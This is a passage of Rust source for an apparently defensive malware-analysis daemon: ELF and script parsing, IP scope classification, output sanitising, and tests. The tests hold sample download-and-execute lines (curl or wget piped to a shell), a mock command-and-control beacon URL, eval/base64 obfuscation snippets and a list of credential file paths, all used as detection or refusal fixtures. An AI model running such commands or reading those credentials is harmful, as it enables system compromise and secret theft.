/// findings, and a matcher that only says "an IP" makes the reader do the work
/// that the tool exists to do.
pub fn ipv4_scope(s: &str) -> Option<&'static str> {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return None;
    }
    let mut o = [0u16; 4];
    for (i, p) in parts.iter().enumerate() {
        if p.is_empty() || p.len() > 3 || !p.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        // `010.1.1.1` is not an address anyone writes on purpose, and rejecting
        // it keeps version strings like `1.02.3.4` out.
        if p.len() > 1 && p.starts_with('0') {
            return None;
        }
        let v: u16 = p.parse().ok()?;
        if v > 255 {
            return None;
        }
        o[i] = v;
    }
    Some(match (o[0], o[1]) {
        (0, _) => "unspecified",
        (127, _) => "loopback",
        (10, _) => "private",
        (172, b) if (16..=31).contains(&b) => "private",
        (192, 168) => "private",
        (169, 254) => "link-local",
        (100, b) if (64..=127).contains(&b) => "cgnat",
        (224..=239, _) => "multicast",
        (255, 255) => "broadcast",
        _ => "public",
    })
}

// ----------------------------------------------------------------------- script

fn parse_script(text: &str) -> Script {
    let first = text.lines().next().unwrap_or("");
    let shebang = if first.starts_with("#!") {
        safe(first.trim(), 160)
    } else {
        String::new()
    };
    // The interpreter is the first word after `#!`, or the second when the
    // first is `env`. `#!/usr/bin/env -S node --experimental-modules` is
    // ordinary and `env` is not the interpreter.
    let interpreter = {
        let body = first.trim_start_matches("#!").trim();
        let mut words = body.split_whitespace();
        let head = words.next().unwrap_or("");
        if util::basename(head) == "env" {
            let mut next = words.next().unwrap_or("");
            while next.starts_with('-') {
                next = words.next().unwrap_or("");
            }
            safe(next, 80)
        } else {
            safe(head, 80)
        }
    };
    Script {
        shebang,
        interpreter,
        lines: text.lines().count(),
        longest_line: text.lines().map(|l| l.len()).max().unwrap_or(0),
    }
}

// -------------------------------------------------------------------- ELF

/// A bounds-checked little reader. Every field of an ELF being parsed here came
/// off an attacker's disk, so nothing indexes a slice directly: a truncated or
/// hand-forged header must produce a partial answer, never a panic in a daemon
/// running as root.
struct R<'a> {
    b: &'a [u8],
    le: bool,
}

impl<'a> R<'a> {
    /// Every offset here is arithmetic on numbers an attacker wrote into the
    /// file, so the adds are checked: a forged `e_shoff` near `usize::MAX`
    /// overflowed a plain `at + 2` and panicked the parser, in a daemon running
    /// as root, on a file it was reading *because* it was suspected.
    fn slice(&self, at: usize, n: usize) -> Option<&[u8]> {
        self.b.get(at..at.checked_add(n)?)
    }
    fn u16(&self, at: usize) -> Option<u16> {
        let s: [u8; 2] = self.slice(at, 2)?.try_into().ok()?;
        Some(if self.le {
            u16::from_le_bytes(s)
        } else {
            u16::from_be_bytes(s)
        })
    }
    fn u32(&self, at: usize) -> Option<u32> {
        let s: [u8; 4] = self.slice(at, 4)?.try_into().ok()?;
        Some(if self.le {
            u32::from_le_bytes(s)
        } else {
            u32::from_be_bytes(s)
        })
    }
    fn u64(&self, at: usize) -> Option<u64> {
        let s: [u8; 8] = self.slice(at, 8)?.try_into().ok()?;
        Some(if self.le {
            u64::from_le_bytes(s)
        } else {
            u64::from_be_bytes(s)
        })
    }
    /// A word of the file's own class: 4 bytes for ELF32, 8 for ELF64.
    fn word(&self, at: usize, w64: bool) -> Option<u64> {
        if w64 {
            self.u64(at)
        } else {
            self.u32(at).map(|v| v as u64)
        }
    }
    /// A NUL-terminated string at `off` inside a string table.
    fn cstr(&self, table: usize, off: usize, cap: usize) -> Option<String> {
        let start = table.checked_add(off)?;
        let slice = self.b.get(start..)?;
        let end = slice.iter().position(|b| *b == 0).unwrap_or(slice.len());
        Some(safe(&String::from_utf8_lossy(&slice[..end.min(cap)]), cap))
    }
}

const PT_LOAD: u32 = 1;
const PT_DYNAMIC: u32 = 2;
const PT_INTERP: u32 = 3;
const SHT_SYMTAB: u32 = 2;
const SHT_STRTAB: u32 = 3;
const SHT_DYNSYM: u32 = 11;
const SHT_NOBITS: u32 = 8;
const DT_NULL: u64 = 0;
const DT_NEEDED: u64 = 1;
const DT_STRTAB: u64 = 5;
const DT_RPATH: u64 = 15;
const DT_RUNPATH: u64 = 29;

pub fn parse_elf(buf: &[u8]) -> Option<Elf> {
    if buf.len() < 64 || !buf.starts_with(b"\x7fELF") {
        return None;
    }
    let class = *buf.get(4)?;
    let data = *buf.get(5)?;
    let w64 = class == 2;
    let r = R { b: buf, le: data != 2 };
    let mut e = Elf {
        class: if w64 { "elf64" } else { "elf32" }.into(),
        kind: match r.u16(16).unwrap_or(0) {
            1 => "rel",
            2 => "exec",
            3 => "dyn",
            4 => "core",
            _ => "unknown",
        }
        .into(),
        machine: machine_name(r.u16(18).unwrap_or(0)).into(),
        linkage: "unknown".into(),
        stripped: true,
        ..Default::default()
    };
    if data == 2 {
        e.notes.push("big-endian ELF on an x86-64 workstation".into());
    }

    // --- program headers: the interpreter, the dynamic table, and the vaddr
    // map. These are read even when section headers exist, because a packer's
    // first move is to strip section headers and PT_* is what the kernel
    // itself uses -- it cannot lie and still run.
    let (phoff, phentsize, phnum, shoff, shentsize, shnum, shstrndx) = if w64 {
        (
            r.u64(32)? as usize,
            r.u16(54)? as usize,
            r.u16(56)? as usize,
            r.u64(40)? as usize,
            r.u16(58)? as usize,
            r.u16(60)? as usize,
            r.u16(62)? as usize,
        )
    } else {
        (
            r.u32(28)? as usize,
            r.u16(42)? as usize,
            r.u16(44)? as usize,
            r.u32(32)? as usize,
            r.u16(46)? as usize,
            r.u16(48)? as usize,
            r.u16(50)? as usize,
        )
    };

    let mut loads: Vec<(u64, u64, u64)> = Vec::new(); // vaddr, filesz, offset
    let mut dyn_at: Option<(usize, usize)> = None; // offset, size
    let mut has_interp = false;
    for i in 0..phnum.min(256) {
        let base = phoff.saturating_add(i.saturating_mul(phentsize));
        let at = |n: usize| base.saturating_add(n);
        let (p_type, p_offset, p_vaddr, p_filesz) = if w64 {
            (r.u32(base)?, r.u64(at(8))?, r.u64(at(16))?, r.u64(at(32))?)
        } else {
            (r.u32(base)?, r.u32(at(4))? as u64, r.u32(at(8))? as u64, r.u32(at(16))? as u64)
        };
        match p_type {
            PT_LOAD => loads.push((p_vaddr, p_filesz, p_offset)),
            PT_INTERP => {
                has_interp = true;
                e.interp = r.cstr(p_offset as usize, 0, 128);
            }
            PT_DYNAMIC => dyn_at = Some((p_offset as usize, p_filesz as usize)),
            _ => {}
        }
    }

    // --- section headers, when they are there.
    let mut dynstr: Option<usize> = None;
    let mut dynsym: Option<(usize, usize, usize)> = None; // off, size, entsize
    if shnum > 0 && shoff > 0 && shentsize > 0 {
        let shstr_off = {
            let base = shoff.saturating_add(shstrndx.saturating_mul(shentsize));
            r.word(base.saturating_add(if w64 { 24 } else { 16 }), w64)
                .unwrap_or(0) as usize
        };
        for i in 0..shnum.min(512) {
            let base = shoff.saturating_add(i.saturating_mul(shentsize));
            let Some(name_off) = r.u32(base) else { break };
            let Some(sh_type) = r.u32(base.saturating_add(4)) else { break };
            let (off_at, size_at) = if w64 { (24, 32) } else { (16, 20) };
            let sh_off = r.word(base.saturating_add(off_at), w64).unwrap_or(0) as usize;
            let sh_size = r.word(base.saturating_add(size_at), w64).unwrap_or(0);
            let name = r
                .cstr(shstr_off, name_off as usize, 64)
                .unwrap_or_default();
            if sh_type == SHT_SYMTAB {
                e.stripped = false;
            }
            if name == ".dynstr" && sh_type == SHT_STRTAB {
                dynstr = Some(sh_off);
            }
            if sh_type == SHT_DYNSYM {
                let entsize = r
                    .word(base.saturating_add(if w64 { 56 } else { 36 }), w64)
                    .unwrap_or(0) as usize;
                dynsym = Some((sh_off, sh_size as usize, entsize));
            }
            if e.sections.len() < MAX_SECTIONS && !name.is_empty() {
                // SHT_NOBITS (.bss) occupies no file bytes; hashing whatever
                // happens to be at its offset would report the entropy of the
                // next section, which is worse than reporting none.
                let entropy = if sh_type == SHT_NOBITS {
                    0.0
                } else {
                    buf.get(sh_off..sh_off.saturating_add(sh_size as usize))
                        .map(shannon)
                        .unwrap_or(0.0)
                };
                e.sections.push(Section {
                    name,
                    size: sh_size,
                    entropy,
                });
            }
        }
    } else {
        e.notes
            .push("no section headers: the file was stripped of them, which linkers do not do and packers do".into());
    }

    // --- the dynamic table. DT_STRTAB is a virtual address, so when there are
    // no section headers it is mapped back through PT_LOAD -- the same
    // arithmetic the loader does.
    if let Some((off, size)) = dyn_at {
        let esz = if w64 { 16 } else { 8 };
        let strtab = dynstr.or_else(|| {
            let mut found = None;
            for i in 0..(size / esz).min(2048) {
                let at = off.saturating_add(i.saturating_mul(esz));
                let Some(tag) = r.word(at, w64) else { break };
                let Some(val) = r.word(at.saturating_add(esz / 2), w64) else { break };
                if tag == DT_STRTAB {
                    found = vaddr_to_off(&loads, val);
                }
                if tag == DT_NULL {
                    break;
                }
            }
            found
        });
        if let Some(strtab) = strtab {
            for i in 0..(size / esz).min(2048) {
                let at = off.saturating_add(i.saturating_mul(esz));
                let Some(tag) = r.word(at, w64) else { break };
                let Some(val) = r.word(at.saturating_add(esz / 2), w64) else { break };
                match tag {
                    DT_NULL => break,
                    DT_NEEDED if e.needed.len() < MAX_NEEDED => {
                        if let Some(s) = r.cstr(strtab, val as usize, 96) {
                            if !s.is_empty() {
                                e.needed.push(s);
                            }
                        }
                    }
                    DT_RPATH | DT_RUNPATH => {
                        if let Some(s) = r.cstr(strtab, val as usize, 160) {
                            if !s.is_empty() {
                                e.runpath.push(s);
                            }
                        }
                    }
                    _ => {}
                }
            }
        }
        // Undefined dynamic symbols: the imports.
        if let (Some((soff, ssize, sesz)), Some(strtab)) = (dynsym, strtab) {
            let sesz = if sesz == 0 { if w64 { 24 } else { 16 } } else { sesz };
            for i in 0..(ssize / sesz).min(8192) {
                if e.imports.len() >= MAX_IMPORTS {
                    break;
                }
                let at = soff.saturating_add(i.saturating_mul(sesz));
                let Some(name_off) = r.u32(at) else { break };
                let shndx = if w64 {
                    r.u16(at.saturating_add(6))
                } else {
                    r.u16(at.saturating_add(14))
                };
                if shndx != Some(0) || name_off == 0 {
                    continue;
                }
                if let Some(s) = r.cstr(strtab, name_off as usize, 96) {
                    if !s.is_empty() && !e.imports.contains(&s) {
                        e.imports.push(s);
                    }
                }
            }
        }
    }

    e.linkage = if has_interp || !e.needed.is_empty() {
        "dynamic".into()
    } else {
        "static".into()
    };
    if e.linkage == "static" && e.kind == "dyn" {
        e.notes.push("static-pie: no interpreter and no needed libraries".into());
    }
    if buf.windows(4).take(4096).any(|w| w == b"UPX!") {
        e.notes.push("UPX magic in the header: the file is packed".into());
    }
    if let Some(t) = e.sections.iter().find(|s| s.name == ".text") {
        if t.entropy > 7.2 {
            e.notes.push(format!(
                ".text entropy {:.2} — compiled code sits near 6.0; this reads as packed or encrypted",
                t.entropy
            ));
        }
    }
    if !e.runpath.is_empty() {
        e.notes
            .push("carries an RPATH/RUNPATH, which decides where its libraries come from".into());
    }
    Some(e)
}

fn vaddr_to_off(loads: &[(u64, u64, u64)], vaddr: u64) -> Option<usize> {
    for (v, filesz, off) in loads {
        if vaddr >= *v && vaddr < v.saturating_add(*filesz) {
            return usize::try_from(off.saturating_add(vaddr - v)).ok();
        }
    }
    None
}

fn machine_name(m: u16) -> &'static str {
    match m {
        3 => "x86",
        40 => "arm",
        62 => "x86-64",
        183 => "aarch64",
        243 => "riscv",
        _ => "other",
    }
}

// ------------------------------------------------------------------ sanitising

/// Make attacker-controlled text safe to put on a terminal and in a bundle.
///
/// Evidence lines are printed by `moatctl show` and rendered by the panel, so a
/// string out of a hostile binary is one `\x1b[` away from being a terminal
/// escape sequence rather than text. Everything outside printable ASCII becomes
/// `.` — including the bidi overrides, which can otherwise reverse how a
/// hostname reads on screen — and the result is truncated with a visible
/// marker rather than silently.
pub fn safe(s: &str, max: usize) -> String {
    let mut out = String::with_capacity(s.len().min(max) + 4);
    for c in s.chars() {
        if out.len() >= max {
            out.push_str("...");
            break;
        }
        if matches!(c, ' '..='~') {
            out.push(c);
        } else {
            out.push('.');
        }
    }
    out
}

fn sha256_bytes(buf: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(buf);
    util::hex(&h.finalize())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn elf_of(path: &str) -> Elf {
        let buf = std::fs::read(path).unwrap();
        parse_elf(&buf).unwrap_or_else(|| panic!("{} did not parse as ELF", path))
    }

    #[test]
    fn magic_beats_the_extension() {
        assert_eq!(kind_of(b"\x7fELF\x02\x01\x01"), "elf");
        assert_eq!(kind_of(b"#!/bin/sh\nid\n"), "script");
        assert_eq!(kind_of(b"PK\x03\x04zzzz"), "archive");
        assert_eq!(kind_of(b"MZ\x90\x00"), "pe");
        assert_eq!(kind_of(b""), "empty");
        assert_eq!(kind_of(b"\x00\x01\x02\x03\x04\x05"), "data");
    }

    /// The whole reason entropy is worth a pass over the file.
    #[test]
    fn entropy_separates_text_from_random() {
        let prose = b"the quick brown fox jumps over the lazy dog, again and again and again";
        assert!(shannon(prose) < 5.0, "{}", shannon(prose));
        let mut rnd = Vec::new();
        let mut x: u32 = 12345;
        for _ in 0..8192 {
            x = x.wrapping_mul(1103515245).wrapping_add(12345);
            rnd.push((x >> 16) as u8);
        }
        assert!(shannon(&rnd) > 7.5, "{}", shannon(&rnd));
        assert_eq!(shannon(&[]), 0.0);
        assert_eq!(shannon(&[7u8; 100]), 0.0);
    }

    #[test]
    fn addresses_are_classified_not_just_matched() {
        assert_eq!(ipv4_scope("127.0.0.1"), Some("loopback"));
        assert_eq!(ipv4_scope("192.168.1.14"), Some("private"));
        assert_eq!(ipv4_scope("172.16.0.9"), Some("private"));
        assert_eq!(ipv4_scope("172.32.0.9"), Some("public"));
        assert_eq!(ipv4_scope("169.254.169.254"), Some("link-local"));
        assert_eq!(ipv4_scope("100.64.0.1"), Some("cgnat"));
        assert_eq!(ipv4_scope("45.9.148.99"), Some("public"));
        assert_eq!(ipv4_scope("0.0.0.0"), Some("unspecified"));
        assert_eq!(ipv4_scope("1.2.3"), None);
        assert_eq!(ipv4_scope("256.1.1.1"), None);
        // Version strings must not become addresses.
        assert_eq!(ipv4_scope("1.02.3.4"), None);
        assert_eq!(ipv4_scope("v1.2.3.4"), None);
    }

    #[test]
    fn a_c2_string_in_a_blob_is_found_and_classified() {
        let mut buf: Vec<u8> = vec![0u8; 64];
        buf.extend_from_slice(b"\x00connect to https://evil.example.top/beacon now\x00");
        buf.extend_from_slice(b"\x00fallback 45.9.148.99 and 127.0.0.1 and 192.168.1.14\x00");
        let a = inspect(&buf);
        assert!(a.urls.iter().any(|u| u == "https://evil.example.top/beacon"), "{:?}", a.urls);
        let scope = |v: &str| {
            a.hosts
                .iter()
                .find(|h| h.value == v)
                .map(|h| h.scope.clone())
                .unwrap_or_default()
        };
        assert_eq!(scope("evil.example.top"), "domain");
        assert_eq!(scope("45.9.148.99"), "public");
        assert_eq!(scope("127.0.0.1"), "loopback");
        assert_eq!(scope("192.168.1.14"), "private");
    }

    #[test]
    fn the_obfuscation_vocabulary_fires_on_the_shapes_it_was_copied_for() {
        let js = "const d = Buffer.from(B,'base64').toString(); new Function(d)()";
        let names: Vec<String> = find_markers(js).into_iter().map(|m| m.name).collect();
        assert!(names.contains(&"decode:buffer-base64".to_string()), "{:?}", names);
        assert!(names.contains(&"exec:new-function".to_string()), "{:?}", names);

        for line in [
            "curl -sL https://x.example.com/i.sh | sh",
            "wget -qO- http://x/y | sudo bash",
            "sh -c \"$(curl -fsSL http://x/y)\"",
            "bash <(curl -s http://x/y)",
            "curl http://x/y | python3 -",
        ] {
            assert!(curl_pipe_shell(line).is_some(), "missed: {}", line);
        }
        // The shape that is NOT a pipe to a shell.
        assert!(curl_pipe_shell("curl -s http://x/y | jq .name").is_none());
        assert!(curl_pipe_shell("echo hi | sh").is_none());
    }

    /// Hostile bytes must never reach a terminal as control characters. This is
    /// the property that lets `evidence()` be printed by `moatctl show`.
    #[test]
    fn sanitising_kills_escapes_and_bidi() {
        assert_eq!(safe("\x1b[31mred\x1b[0m", 80), ".[31mred.[0m");
        assert_eq!(safe("a\u{202e}b", 80), "a.b");
        assert_eq!(safe("line\nbreak", 80), "line.break");
        assert!(safe(&"x".repeat(500), 20).ends_with("..."));
        assert_eq!(safe("x", 20), "x");
    }

    /// A forged or truncated ELF header must produce a partial answer, never a
    /// panic: this parser runs as root over attacker-chosen bytes.
    #[test]
    fn a_hostile_elf_header_cannot_panic_the_parser() {
        let mut bad = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
        bad.resize(64, 0xff);
        let _ = parse_elf(&bad);
        // Truncated below the header entirely.
        assert!(parse_elf(&[0x7f, b'E', b'L', b'F']).is_none());
        // Every prefix of a real binary.
        let real = std::fs::read("/bin/sh").unwrap();
        for n in [64, 100, 512, 4096, 65536] {
            if n < real.len() {
                let _ = parse_elf(&real[..n]);
            }
        }
        // Section/program counts claiming the moon.
        let mut lies = real[..real.len().min(8192)].to_vec();
        lies[56] = 0xff;
        lies[57] = 0xff;
        lies[60] = 0xff;
        lies[61] = 0xff;
        let _ = parse_elf(&lies);

        // Table offsets at the top of the address space. `shoff + i * shentsize`
        // is arithmetic on three attacker-written numbers, and in a debug build
        // an overflow there is a panic -- which is why every one of those adds
        // is saturating.
        let mut moon = real[..real.len().min(65536)].to_vec();
        for at in [32usize, 40] {
            moon[at..at + 8].copy_from_slice(&u64::MAX.to_le_bytes());
        }
        let _ = parse_elf(&moon);

        // Deterministic mutation sweep over the whole header region: every
        // single byte of it, set to each of the four values most likely to be
        // an edge (0, 1, 0x7f, 0xff), one at a time.
        for at in 0..256.min(real.len()) {
            for v in [0u8, 1, 0x7f, 0xff] {
                let mut m = real[..real.len().min(65536)].to_vec();
                m[at] = v;
                let _ = parse_elf(&m);
            }
        }
    }

    #[test]
    fn a_real_dynamic_binary_reads_the_way_ldd_and_nm_do() {
        let e = elf_of("/bin/sh");
        assert_eq!(e.class, "elf64");
        assert_eq!(e.machine, "x86-64");
        assert_eq!(e.linkage, "dynamic");
        assert!(
            e.needed.iter().any(|n| n.starts_with("libc.so")),
            "needed: {:?}",
            e.needed
        );
        // The exact symbol list is libc's business and changes with the
        // toolchain; that there ARE undefined symbols, and that they read like
        // libc, is the fact worth asserting.
        assert!(!e.imports.is_empty(), "no imports parsed");
        assert!(
            e.imports.iter().any(|i| i.starts_with("mem") || i.starts_with("str") || i == "close"),
            "imports: {:?}",
            e.imports
        );
        assert!(e.sections.iter().any(|s| s.name == ".text"));
        assert!(e.interp.as_deref().unwrap_or("").contains("ld-linux"));
    }

    #[test]
    fn the_shebang_survives_env_and_its_flags() {
        assert_eq!(parse_script("#!/bin/bash\nid\n").interpreter, "/bin/bash");
        assert_eq!(
            parse_script("#!/usr/bin/env -S node --loader x\nx\n").interpreter,
            "node"
        );
        assert_eq!(parse_script("#!/usr/bin/env python3\n").interpreter, "python3");
        assert_eq!(parse_script("no shebang\n").shebang, "");
    }

    // ------------------------------------------------------------ the limits

    fn tmpfile(dir: &Path, name: &str, body: &[u8]) -> String {
        let p = dir.join(name);
        std::fs::write(&p, body).unwrap();
        p.display().to_string()
    }

    #[test]
    fn an_oversized_file_is_skipped_and_says_so() {
        let d = tempfile::tempdir().unwrap();
        let p = tmpfile(d.path(), "big", &vec![0u8; 4096]);
        let mut a = Analyzer::new(Limits {
            max_bytes: 100,
            ..Limits::default()
        });
        let r = a.analyse(&p, "trigger", None, 1000);
        assert!(r.skipped.unwrap().contains("over the 100 byte"));
        // Skipping costs nothing from the budget: it never read the file.
        assert_eq!(a.used_this_hour(), 0);
    }

    #[test]
    fn the_hourly_budget_holds_and_rolls() {
        let d = tempfile::tempdir().unwrap();
        let mut a = Analyzer::new(Limits {
            per_hour: 2,
            ..Limits::default()
        });
        // Distinct contents, so the sha cache cannot be what stops it.
        for i in 0..2 {
            let p = tmpfile(d.path(), &format!("f{}", i), format!("body {}", i).as_bytes());
            assert!(a.analyse(&p, "trigger", None, 1000).skipped.is_none());
        }
        let p = tmpfile(d.path(), "f3", b"body 3");
        let r = a.analyse(&p, "trigger", None, 1000);
        assert!(r.skipped.unwrap().contains("budget"));
        assert_eq!(a.deferred, 1);
        // An hour later the allowance is fresh -- and it is anchored on first
        // use, not on the wall clock hour.
        assert!(a.analyse(&p, "trigger", None, 1000 + 3600).skipped.is_none());
    }

    #[test]
    fn the_same_bytes_are_never_analysed_twice() {
        let d = tempfile::tempdir().unwrap();
        let one = tmpfile(d.path(), "a", b"#!/bin/sh\ncurl http://x/y | sh\n");
        let two = tmpfile(d.path(), "b", b"#!/bin/sh\ncurl http://x/y | sh\n");
        let mut a = Analyzer::new(Limits::default());
        let r1 = a.analyse(&one, "trigger", None, 1000);
        let used = a.used_this_hour();
        let r2 = a.analyse(&two, "quarantined", None, 1000);
        assert_eq!(r1.sha256, r2.sha256);
        assert_eq!(r2.markers, r1.markers);
        // The cached answer is re-labelled for the path that asked for it.
        assert_eq!(r2.path, two);
        assert_eq!(r2.role, "quarantined");
        // The second read still happened (the hash was not known in advance),
        // but a known hash short-circuits before any I/O.
        assert_eq!(a.used_this_hour(), used + 1);
        let r3 = a.analyse("/nonexistent/gone", "trigger", Some(&r1.sha256), 1000);
        assert!(r3.skipped.is_none(), "a known sha must answer from cache");
        assert_eq!(a.used_this_hour(), used + 1);
    }

    /// The two refusals that are not negotiable.
    #[test]
    fn credentials_and_moats_own_store_are_never_read() {
        let mut a = Analyzer::new(Limits::default());
        for p in [
            "/home/dan/.ssh/id_ed25519",
            "/home/dan/.aws/credentials",
            "/home/dan/.config/gh/hosts.yml",
            "/home/dan/project/.env",
            "/home/dan/x.pem",
        ] {
            let r = a.analyse(p, "trigger", None, 1000);
            assert!(
                r.skipped.unwrap().contains("credential"),
                "{} was not refused as a credential",
                p
            );
        }
        for p in [
            "/var/lib/moat/incidents/01ABC/actor.dropper.suspect",
            "/var/lib/moat/quarantine/01ABC/payload",
            "/var/log/moat/moatd.log",
        ] {
            let r = a.analyse(p, "quarantined", None, 1000);
            assert!(
                r.skipped.unwrap().contains("own evidence store"),
                "{} was not refused as moat's own store",
                p
            );
        }
        assert_eq!(a.used_this_hour(), 0);
    }

    /// The 2026-09-05 shape: a benign-looking name pointing at a credential.
    /// The refusal has to survive the follow, not just the string.
    #[test]
    fn a_symlink_to_a_credential_is_refused_at_the_descriptor() {
        let d = tempfile::tempdir().unwrap();
        let secret = tmpfile(d.path(), "id_rsa_like.pem", b"-----BEGIN PRIVATE KEY-----\n");
        let bait = d.path().join("bait");
        std::os::unix::fs::symlink(&secret, &bait).unwrap();
        let mut a = Analyzer::new(Limits::default());
        let r = a.analyse(&bait.display().to_string(), "trigger", None, 1000);
        let why = r.skipped.unwrap();
        assert!(why.contains("symbolic link"), "{}", why);
        assert!(r.strings.is_empty());
    }

    /// A symlinked *parent* walks past O_NOFOLLOW, so the answer has to come
    /// from the descriptor rather than from the string.
    #[test]
    fn a_symlinked_parent_directory_is_caught_after_the_open() {
        let d = tempfile::tempdir().unwrap();
        let real = d.path().join("real");
        std::fs::create_dir(&real).unwrap();
        std::fs::write(real.join("credentials"), b"aws_secret_access_key = x\n").unwrap();
        let link = d.path().join(".aws-ish");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let mut a = Analyzer::new(Limits {
            deny_roots: vec![real.display().to_string()],
            ..Limits::default()
        });
        // The path as given is not under the denied root; the descriptor is.
        let r = a.analyse(&link.join("credentials").display().to_string(), "trigger", None, 1000);
        let why = r.skipped.expect("the resolved path must be re-checked");
        assert!(why.contains("resolved to"), "{}", why);
    }

    #[test]
    fn a_fifo_cannot_hang_the_daemon() {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("pipe");
        let c = std::ffi::CString::new(p.display().to_string()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        let mut a = Analyzer::new(Limits::default());
        let r = a.analyse(&p.display().to_string(), "trigger", None, 1000);
        assert!(r.skipped.unwrap().contains("not a regular file"));
    }

    #[test]
    fn evidence_lines_carry_facts_and_no_raw_control_bytes() {
        let mut buf = b"#!/bin/sh\ncurl http://45.9.148.99/a \x1b[2J| sh\n".to_vec();
        buf.extend_from_slice(b"eval(atob('QUJD'))\n");
        let mut a = inspect(&buf);
        a.path = "/tmp/\x1b]0;pwned\x07setup.sh".into();
        let lines = a.evidence();
        assert!(lines.iter().all(|l| !l.chars().any(|c| c.is_control())), "{:?}", lines);
        assert!(lines[0].contains("script"), "{:?}", lines);
        assert!(
            lines.iter().any(|l| l.contains("45.9.148.99 [public]")),
            "{:?}",
            lines
        );
        assert!(
            lines.iter().any(|l| l.contains("exec:eval")),
            "{:?}",
            lines
        );
    }

    #[test]
    fn a_skipped_file_still_produces_one_honest_evidence_line() {
        let a = FileAnalysis::skipped("/tmp/x", "trigger", "over the cap".into());
        let lines = a.evidence();
        assert_eq!(lines.len(), 1);
        assert!(lines[0].contains("not analysed: over the cap"));
    }

    #[test]
    fn the_record_round_trips_through_json() {
        let a = inspect(&std::fs::read("/bin/sh").unwrap());
        let v = a.to_json();
        let back: FileAnalysis = serde_json::from_value(v).unwrap();
        assert_eq!(back.elf.unwrap().machine, "x86-64");
    }

    /// `cargo test -- --ignored --nocapture bench_` — the number quoted in the
    /// design notes for "does this need to come off the event thread".
    #[test]
    #[ignore]
    fn bench_analysis_cost() {
        let candidates = [
            "/usr/lib/libcrypto.so.3",
            "/usr/bin/git",
            "/usr/bin/gcc",
            "/bin/bash",
            "/bin/sh",
        ];
        for path in candidates {
            let Ok(buf) = std::fs::read(path) else { continue };
            let t0 = std::time::Instant::now();
            let a = inspect(&buf);
            let inspect_us = t0.elapsed().as_micros();
            let t1 = std::time::Instant::now();
            let sha = sha256_bytes(&buf);
            let sha_us = t1.elapsed().as_micros();
            println!(
                "{:<34} {:>10} bytes  inspect {:>7} us  sha256 {:>7} us  entropy {:.2}  imports {}  sha {}",
                path,
                buf.len(),
                inspect_us,
                sha_us,
                a.entropy,
                a.elf.as_ref().map(|e| e.imports.len()).unwrap_or(0),
                &sha[..8],
            );
        }
    }
}
